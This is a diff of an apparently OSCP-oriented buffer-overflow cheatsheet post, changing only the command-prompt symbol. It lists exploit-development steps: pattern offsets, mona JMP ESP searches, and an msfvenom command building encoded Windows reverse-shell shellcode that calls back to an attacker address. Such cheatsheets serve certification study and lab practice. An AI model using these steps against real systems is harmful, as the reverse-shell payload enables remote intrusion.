@@ -6,22 +6,22 @@ date: "2021-03-30 00:01"
 tags: [OSCP, Cheatsheet]
 layout: post
 ---
- 
+
 ###### Pattern create and offset
 ```
-> msf-pattern_create -l 3000 > pattern.txt
-> msf-pattern_offset -l 3000 -q 61413161
+$ msf-pattern_create -l 3000 > pattern.txt
+$ msf-pattern_offset -l 3000 -q 61413161
 ```
 
 ###### Mona commands
 ```
-> !mona modules
-> !mona find -s "\xff\xe4" -m dllname.dll
+$ !mona modules
+$ !mona find -s "\xff\xe4" -m dllname.dll
 ```
 
 ###### JMP instructions
 ```
-> msf-nasm_shell
+$ msf-nasm_shell
 jmp esp = FFE4
 jmp eax = FFE0
 ```
@@ -60,5 +60,5 @@ jmp eax = FFE0
 
 ###### Create Shellcode for an unstaged reverse shell
 ```
-> msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f c -e x86/shikata_ga_nai -b “\x00\” > shellcode.txt
+$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f c -e x86/shikata_ga_nai -b “\x00\” > shellcode.txt
 ```
